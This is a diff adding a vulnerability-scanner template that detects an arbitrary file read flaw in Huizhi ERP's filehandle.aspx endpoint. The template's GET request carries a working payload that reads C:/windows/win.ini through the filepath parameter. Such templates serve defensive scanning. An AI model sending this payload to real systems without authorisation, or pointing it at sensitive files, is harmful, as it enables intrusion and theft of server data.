@@ -1,0 +1,26 @@
+id: huizhi-erp-filehandle-aspx-anyfile-read
+info:
+  name: Huizhi ERP Arbitrary File Read via filehandle.aspx
+  author: ProjectDiscoveryAI
+  severity: high
+  tags: file-read
+  description: |
+    This template detects the arbitrary file read vulnerability in Huizhi ERP via the filehandle.aspx endpoint. It checks for the ability to read sensitive files such as win.ini.
+http:
+  - method: GET
+    path:
+      - "{{BaseURL}}/nssys/common/filehandle.aspx?filepath=C%3a%2fwindows%2fwin%2eini"
+    matchers-condition: and
+    matchers:
+      - type: status
+        status:
+          - 200
+      - type: word
+        part: body
+        words:
+          - "; for 16-bit app support"
+          - "[files]"
+      - type: word
+        part: header
+        words:
+          - "filename=win.ini"
